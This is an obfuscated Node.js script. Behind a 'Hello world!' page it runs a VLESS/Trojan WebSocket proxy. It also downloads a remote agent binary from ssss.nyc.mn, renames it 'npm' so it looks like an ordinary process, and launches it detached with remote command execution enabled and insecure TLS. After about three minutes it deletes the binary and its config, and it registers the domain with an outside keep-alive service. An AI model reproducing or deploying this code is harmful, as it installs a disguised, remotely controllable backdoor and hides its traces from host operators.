function _0xf5e7(){const _0xda9a0f=['vless://','utf8','log','NEZHA_PORT','readFile','createWriteStream','https://arm64.ssss.nyc.mn/v1','writeFileSync','test','connect','net','length','Failed\x20to\x20resolve\x20','\x20-p\x20','utf-8','499048UMnmDW','4221lWXLlU','aarch64','client_secret:\x20','pipe','country_code','once','155215OLKQvl','catch','2053','url','30665uuBFTk','text/html','Answer','type',':443?security=tls&sni=','1e6e6a14-10ef-40c4-a345-c7f6e7c5d29c','Server\x20is\x20running\x20on\x20port\x20','25460AMTJKk','connection','https://amd64.ssss.nyc.mn/v1','npm\x20is\x20running','trim','substr','get','Unknown','from','&path=%2F','200iweJpT','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2087','toString','application/json','NEZHA_KEY','error','readUInt8','false','198Rpfywj','UUID','crypto','Server','1831372XufMmu','createServer','finish','&type=A','443',':443?encryption=none&security=tls&sni=','then','close','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','npm\x20running\x20error:','env','NEZHA_SERVER','3648078GpvROh','https://amd64.ssss.nyc.mn/agent','end','createHash','config.yaml','listen','&fp=chrome&type=ws&host=','Not\x20Found\x0a','5448ZxCVwl','arch','isp','https://oooo.serv00.net/add-url','Status','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','writeHead','split','data','unlink','DOMAIN','error:\x20','/bin/bash','3HYMvsx','Hello\x20world!','https://arm64.ssss.nyc.mn/agent','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','--tls','child_process','2096','slice','readUInt16BE','message','sha224','npm\x20is\x20already\x20running,\x20skip\x20running...','join','arm','1234.abc.com','write','https://api.ip.sb/geoip','npm\x20download\x20successfully','reduce','1.1.1.1','http','path','concat','includes','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm','hex','8443'];_0xf5e7=function(){return _0xda9a0f;};return _0xf5e7();}const _0x309325=_0x2333;(function(_0x5b9247,_0x23cbdf){const _0x177ccb=_0x2333,_0x2ccf09=_0x5b9247();while(!![]){try{const _0x9b63e=-parseInt(_0x177ccb(0x173))/0x1+-parseInt(_0x177ccb(0x17e))/0x2+-parseInt(_0x177ccb(0x141))/0x3*(parseInt(_0x177ccb(0x195))/0x4)+parseInt(_0x177ccb(0x177))/0x5*(parseInt(_0x177ccb(0x191))/0x6)+-parseInt(_0x177ccb(0x1a1))/0x7+parseInt(_0x177ccb(0x1a9))/0x8*(parseInt(_0x177ccb(0x16d))/0x9)+parseInt(_0x177ccb(0x188))/0xa*(parseInt(_0x177ccb(0x16c))/0xb);if(_0x9b63e===_0x23cbdf)break;else _0x2ccf09['push'](_0x2ccf09['shift']());}catch(_0x2d9c84){_0x2ccf09['push'](_0x2ccf09['shift']());}}}(_0xf5e7,0x44e54));function _0x2333(_0x559074,_0xf3b2ac){_0x559074=_0x559074-0x138;const _0xf5e707=_0xf5e7();let _0x23334f=_0xf5e707[_0x559074];return _0x23334f;}const os=require('os'),http=require(_0x309325(0x155)),fs=require('fs'),axios=require('axios'),net=require(_0x309325(0x167)),path=require(_0x309325(0x156)),crypto=require(_0x309325(0x193)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x309325(0x146)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x309325(0x19f)][_0x309325(0x192)]||_0x309325(0x17c),NEZHA_SERVER=process[_0x309325(0x19f)][_0x309325(0x1a0)]||'',NEZHA_PORT=process['env'][_0x309325(0x160)]||'',NEZHA_KEY=process['env'][_0x309325(0x18d)]||'',DOMAIN=process['env'][_0x309325(0x13e)]||_0x309325(0x14f),AUTO_ACCESS=process[_0x309325(0x19f)]['AUTO_ACCESS']||!![],WSPATH=process[_0x309325(0x19f)]['WSPATH']||UUID[_0x309325(0x148)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'get',NAME=process['env']['NAME']||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x28fdd4=_0x309325;try{const _0x412060=await axios[_0x28fdd4(0x184)](_0x28fdd4(0x151)),_0x17d596=_0x412060[_0x28fdd4(0x13c)];ISP=(_0x17d596[_0x28fdd4(0x171)]+'-'+_0x17d596[_0x28fdd4(0x1ab)])['replace'](/ /g,'_');}catch(_0x508702){ISP=_0x28fdd4(0x185);}};GetISP();const httpServer=http[_0x309325(0x196)]((_0x58dcb9,_0x555747)=>{const _0x159cd5=_0x309325;if(_0x58dcb9[_0x159cd5(0x176)]==='/'){const _0xce1fed=path[_0x159cd5(0x14d)](__dirname,'index.html');fs[_0x159cd5(0x161)](_0xce1fed,_0x159cd5(0x15e),(_0x4b23a8,_0x25dd69)=>{const _0x3806a8=_0x159cd5;if(_0x4b23a8){_0x555747['writeHead'](0xc8,{'Content-Type':_0x3806a8(0x178)}),_0x555747[_0x3806a8(0x1a3)](_0x3806a8(0x142));return;}_0x555747[_0x3806a8(0x13a)](0xc8,{'Content-Type':'text/html'}),_0x555747[_0x3806a8(0x1a3)](_0x25dd69);});return;}else{if(_0x58dcb9[_0x159cd5(0x176)]==='/'+SUB_PATH){const _0x5d0f82=NAME?NAME+'-'+ISP:ISP,_0x4b520c=_0x159cd5(0x15d)+UUID+'@'+DOMAIN+_0x159cd5(0x19a)+DOMAIN+_0x159cd5(0x1a7)+DOMAIN+_0x159cd5(0x187)+WSPATH+'#'+_0x5d0f82,_0x1fbcd0='trojan://'+UUID+'@'+DOMAIN+_0x159cd5(0x17b)+DOMAIN+_0x159cd5(0x1a7)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x5d0f82,_0x537745=_0x4b520c+'\x0a'+_0x1fbcd0,_0x3df07c=Buffer[_0x159cd5(0x186)](_0x537745)[_0x159cd5(0x18b)]('base64');_0x555747[_0x159cd5(0x13a)](0xc8,{'Content-Type':'text/plain'}),_0x555747[_0x159cd5(0x1a3)](_0x3df07c+'\x0a');}else _0x555747[_0x159cd5(0x13a)](0x194,{'Content-Type':'text/plain'}),_0x555747[_0x159cd5(0x1a3)](_0x159cd5(0x1a8));}}),wss=new WebSocket[(_0x309325(0x194))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x309325(0x154)];function resolveHost(_0x54de8d){return new Promise((_0x3903f9,_0xde2335)=>{const _0x43d1b1=_0x2333;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x43d1b1(0x165)](_0x54de8d)){_0x3903f9(_0x54de8d);return;}let _0x367ba9=0x0;function _0x4e48c3(){const _0x1456d8=_0x43d1b1;if(_0x367ba9>=DNS_SERVERS[_0x1456d8(0x168)]){_0xde2335(new Error(_0x1456d8(0x169)+_0x54de8d+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x1ba15a=DNS_SERVERS[_0x367ba9];_0x367ba9++;const _0x3bc386='https://dns.google/resolve?name='+encodeURIComponent(_0x54de8d)+_0x1456d8(0x198);axios['get'](_0x3bc386,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x1456d8(0x19b)](_0x1d4f9b=>{const _0x34f1fe=_0x1456d8,_0x4fb2a4=_0x1d4f9b[_0x34f1fe(0x13c)];if(_0x4fb2a4[_0x34f1fe(0x138)]===0x0&&_0x4fb2a4[_0x34f1fe(0x179)]&&_0x4fb2a4[_0x34f1fe(0x179)][_0x34f1fe(0x168)]>0x0){const _0x53dbd5=_0x4fb2a4[_0x34f1fe(0x179)]['find'](_0xa8904e=>_0xa8904e[_0x34f1fe(0x17a)]===0x1);if(_0x53dbd5){_0x3903f9(_0x53dbd5[_0x34f1fe(0x13c)]);return;}}_0x4e48c3();})[_0x1456d8(0x174)](_0x3be5d3=>{_0x4e48c3();});}_0x4e48c3();});}function handleVlessConnection(_0x25584a,_0x4d19e3){const _0x190648=_0x309325,[_0x1c0e48]=_0x4d19e3,_0x4bef8e=_0x4d19e3[_0x190648(0x148)](0x1,0x11);if(!_0x4bef8e['every']((_0xee2c36,_0x707d5c)=>_0xee2c36==parseInt(uuid[_0x190648(0x183)](_0x707d5c*0x2,0x2),0x10)))return![];let _0x3777d1=_0x4d19e3[_0x190648(0x148)](0x11,0x12)[_0x190648(0x18f)]()+0x13;const _0x18672c=_0x4d19e3[_0x190648(0x148)](_0x3777d1,_0x3777d1+=0x2)['readUInt16BE'](0x0),_0x207fa3=_0x4d19e3[_0x190648(0x148)](_0x3777d1,_0x3777d1+=0x1)[_0x190648(0x18f)](),_0x46d3c3=_0x207fa3==0x1?_0x4d19e3[_0x190648(0x148)](_0x3777d1,_0x3777d1+=0x4)[_0x190648(0x14d)]('.'):_0x207fa3==0x2?new TextDecoder()['decode'](_0x4d19e3[_0x190648(0x148)](_0x3777d1+0x1,_0x3777d1+=0x1+_0x4d19e3[_0x190648(0x148)](_0x3777d1,_0x3777d1+0x1)[_0x190648(0x18f)]())):_0x207fa3==0x3?_0x4d19e3['slice'](_0x3777d1,_0x3777d1+=0x10)[_0x190648(0x153)]((_0x172dfe,_0xde9b7c,_0x366ed4,_0xaab940)=>_0x366ed4%0x2?_0x172dfe[_0x190648(0x157)](_0xaab940[_0x190648(0x148)](_0x366ed4-0x1,_0x366ed4+0x1)):_0x172dfe,[])['map'](_0xa1512b=>_0xa1512b[_0x190648(0x149)](0x0)[_0x190648(0x18b)](0x10))[_0x190648(0x14d)](':'):'';_0x25584a['send'](new Uint8Array([_0x1c0e48,0x0]));const _0x4cb55e=createWebSocketStream(_0x25584a);return resolveHost(_0x46d3c3)[_0x190648(0x19b)](_0x26776a=>{const _0x3bb2ff=_0x190648;net[_0x3bb2ff(0x166)]({'host':_0x26776a,'port':_0x18672c},function(){const _0x45ec77=_0x3bb2ff;this[_0x45ec77(0x150)](_0x4d19e3['slice'](_0x3777d1)),_0x4cb55e['on'](_0x45ec77(0x18e),()=>{})[_0x45ec77(0x170)](this)['on'](_0x45ec77(0x18e),()=>{})[_0x45ec77(0x170)](_0x4cb55e);})['on'](_0x3bb2ff(0x18e),()=>{});})[_0x190648(0x174)](_0x198a83=>{const _0x453266=_0x190648;net[_0x453266(0x166)]({'host':_0x46d3c3,'port':_0x18672c},function(){const _0x24eff6=_0x453266;this['write'](_0x4d19e3['slice'](_0x3777d1)),_0x4cb55e['on'](_0x24eff6(0x18e),()=>{})['pipe'](this)['on']('error',()=>{})[_0x24eff6(0x170)](_0x4cb55e);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x2a1655,_0x43f913){const _0x226210=_0x309325;try{if(_0x43f913[_0x226210(0x168)]<0x3a)return![];const _0x5391c6=_0x43f913[_0x226210(0x148)](0x0,0x38)[_0x226210(0x18b)](),_0x4009bb=[UUID];let _0x44c68e=null;for(const _0x4f6344 of _0x4009bb){const _0x5cbb84=crypto[_0x226210(0x1a4)](_0x226210(0x14b))['update'](_0x4f6344)['digest'](_0x226210(0x15b));if(_0x5cbb84===_0x5391c6){_0x44c68e=_0x4f6344;break;}}if(!_0x44c68e)return![];let _0x931203=0x38;_0x43f913[_0x931203]===0xd&&_0x43f913[_0x931203+0x1]===0xa&&(_0x931203+=0x2);const _0x290129=_0x43f913[_0x931203];if(_0x290129!==0x1)return![];_0x931203+=0x1;const _0x1ddf94=_0x43f913[_0x931203];_0x931203+=0x1;let _0x1cf344,_0x3bc65e;if(_0x1ddf94===0x1)_0x1cf344=_0x43f913[_0x226210(0x148)](_0x931203,_0x931203+0x4)[_0x226210(0x14d)]('.'),_0x931203+=0x4;else{if(_0x1ddf94===0x3){const _0x4415f3=_0x43f913[_0x931203];_0x931203+=0x1,_0x1cf344=_0x43f913[_0x226210(0x148)](_0x931203,_0x931203+_0x4415f3)[_0x226210(0x18b)](),_0x931203+=_0x4415f3;}else{if(_0x1ddf94===0x4)_0x1cf344=_0x43f913['slice'](_0x931203,_0x931203+0x10)['reduce']((_0x130fa8,_0x5ccaf0,_0xc9d0ee,_0x299541)=>_0xc9d0ee%0x2?_0x130fa8['concat'](_0x299541['slice'](_0xc9d0ee-0x1,_0xc9d0ee+0x1)):_0x130fa8,[])['map'](_0x4b4d66=>_0x4b4d66['readUInt16BE'](0x0)[_0x226210(0x18b)](0x10))['join'](':'),_0x931203+=0x10;else return![];}}_0x3bc65e=_0x43f913[_0x226210(0x149)](_0x931203),_0x931203+=0x2;_0x931203<_0x43f913[_0x226210(0x168)]&&_0x43f913[_0x931203]===0xd&&_0x43f913[_0x931203+0x1]===0xa&&(_0x931203+=0x2);const _0x5e569c=createWebSocketStream(_0x2a1655);return resolveHost(_0x1cf344)[_0x226210(0x19b)](_0x1bfded=>{const _0x3a36a1=_0x226210;net[_0x3a36a1(0x166)]({'host':_0x1bfded,'port':_0x3bc65e},function(){const _0x34526b=_0x3a36a1;_0x931203<_0x43f913[_0x34526b(0x168)]&&this[_0x34526b(0x150)](_0x43f913[_0x34526b(0x148)](_0x931203)),_0x5e569c['on'](_0x34526b(0x18e),()=>{})[_0x34526b(0x170)](this)['on'](_0x34526b(0x18e),()=>{})[_0x34526b(0x170)](_0x5e569c);})['on'](_0x3a36a1(0x18e),()=>{});})[_0x226210(0x174)](_0x4d8790=>{const _0x343786=_0x226210;net[_0x343786(0x166)]({'host':_0x1cf344,'port':_0x3bc65e},function(){const _0x4cf71f=_0x343786;_0x931203<_0x43f913[_0x4cf71f(0x168)]&&this[_0x4cf71f(0x150)](_0x43f913[_0x4cf71f(0x148)](_0x931203)),_0x5e569c['on'](_0x4cf71f(0x18e),()=>{})[_0x4cf71f(0x170)](this)['on'](_0x4cf71f(0x18e),()=>{})['pipe'](_0x5e569c);})['on'](_0x343786(0x18e),()=>{});}),!![];}catch(_0x2c363d){return![];}}wss['on'](_0x309325(0x17f),(_0x32eaf6,_0x367f3e)=>{const _0x4cfd70=_0x309325,_0x2001e2=_0x367f3e['url']||'';_0x32eaf6[_0x4cfd70(0x172)](_0x4cfd70(0x14a),_0x2bc9e6=>{const _0x1b8aa7=_0x4cfd70;if(_0x2bc9e6[_0x1b8aa7(0x168)]>0x11&&_0x2bc9e6[0x0]===0x0){const _0x135ebd=_0x2bc9e6['slice'](0x1,0x11),_0xd2779a=_0x135ebd['every']((_0x2b0e58,_0x3e61b4)=>_0x2b0e58==parseInt(uuid[_0x1b8aa7(0x183)](_0x3e61b4*0x2,0x2),0x10));if(_0xd2779a){!handleVlessConnection(_0x32eaf6,_0x2bc9e6)&&_0x32eaf6['close']();return;}}!handleTrojanConnection(_0x32eaf6,_0x2bc9e6)&&_0x32eaf6[_0x1b8aa7(0x19c)]();})['on'](_0x4cfd70(0x18e),()=>{});});const getDownloadUrl=()=>{const _0x1fa11b=_0x309325,_0x4dc4a7=os[_0x1fa11b(0x1aa)]();return _0x4dc4a7===_0x1fa11b(0x14e)||_0x4dc4a7==='arm64'||_0x4dc4a7===_0x1fa11b(0x16e)?!NEZHA_PORT?_0x1fa11b(0x163):_0x1fa11b(0x143):!NEZHA_PORT?_0x1fa11b(0x180):_0x1fa11b(0x1a2);},downloadFile=async()=>{const _0x115fcf=_0x309325;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x18c8f6=getDownloadUrl(),_0x116a65=await axios({'method':_0x115fcf(0x184),'url':_0x18c8f6,'responseType':'stream'}),_0x6b8237=fs[_0x115fcf(0x162)](_0x115fcf(0x15a));return _0x116a65[_0x115fcf(0x13c)][_0x115fcf(0x170)](_0x6b8237),new Promise((_0x47a3a6,_0x462994)=>{const _0x5d9c9b=_0x115fcf;_0x6b8237['on'](_0x5d9c9b(0x197),()=>{const _0x430a1f=_0x5d9c9b;console[_0x430a1f(0x15f)](_0x430a1f(0x152)),exec('chmod\x20+x\x20npm',_0x1e76ba=>{if(_0x1e76ba)_0x462994(_0x1e76ba);_0x47a3a6();});}),_0x6b8237['on'](_0x5d9c9b(0x18e),_0x462994);});}catch(_0x189508){throw _0x189508;}},runnz=async()=>{const _0xc0a86b=_0x309325;try{const _0x228519=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0xc0a86b(0x16b)});if(_0x228519[_0xc0a86b(0x182)]()!==''){console[_0xc0a86b(0x15f)](_0xc0a86b(0x14c));return;}}catch(_0x1fca44){}await downloadFile();let _0x3e6c5d='',_0x1e7fc4=[_0xc0a86b(0x199),_0xc0a86b(0x15c),_0xc0a86b(0x147),_0xc0a86b(0x18a),'2083',_0xc0a86b(0x175)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x52ea65=_0x1e7fc4[_0xc0a86b(0x158)](NEZHA_PORT)?_0xc0a86b(0x145):'';_0x3e6c5d='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0xc0a86b(0x16a)+NEZHA_KEY+'\x20'+_0x52ea65+_0xc0a86b(0x189);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xa8decf=NEZHA_SERVER[_0xc0a86b(0x158)](':')?NEZHA_SERVER[_0xc0a86b(0x13b)](':')['pop']():'',_0x8a0f76=_0x1e7fc4[_0xc0a86b(0x158)](_0xa8decf)?'true':_0xc0a86b(0x190),_0x513b59=_0xc0a86b(0x16f)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xc0a86b(0x144)+_0x8a0f76+_0xc0a86b(0x159)+UUID;fs[_0xc0a86b(0x164)]('config.yaml',_0x513b59);}_0x3e6c5d=_0xc0a86b(0x139);}else{console['log'](_0xc0a86b(0x19d));return;}}try{exec(_0x3e6c5d,{'shell':_0xc0a86b(0x140)},_0x25cb42=>{const _0x5c17d0=_0xc0a86b;if(_0x25cb42)console[_0x5c17d0(0x18e)](_0x5c17d0(0x19e),_0x25cb42);else console['log'](_0x5c17d0(0x181));});}catch(_0x59a1ce){console[_0xc0a86b(0x18e)](_0xc0a86b(0x13f)+_0x59a1ce);}};async function addAccessTask(){const _0x5c9e2a=_0x309325;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x499003='https://'+DOMAIN;try{const _0x28d3fa=await axios['post'](_0x5c9e2a(0x1ac),{'url':_0x499003},{'headers':{'Content-Type':_0x5c9e2a(0x18c)}});console[_0x5c9e2a(0x15f)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x13a440){}}const delFiles=()=>{const _0x30749d=_0x309325;fs[_0x30749d(0x13d)](_0x30749d(0x15a),()=>{}),fs[_0x30749d(0x13d)](_0x30749d(0x1a5),()=>{});};httpServer[_0x309325(0x1a6)](PORT,()=>{const _0x3a29e4=_0x309325;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3a29e4(0x15f)](_0x3a29e4(0x17d)+PORT);});
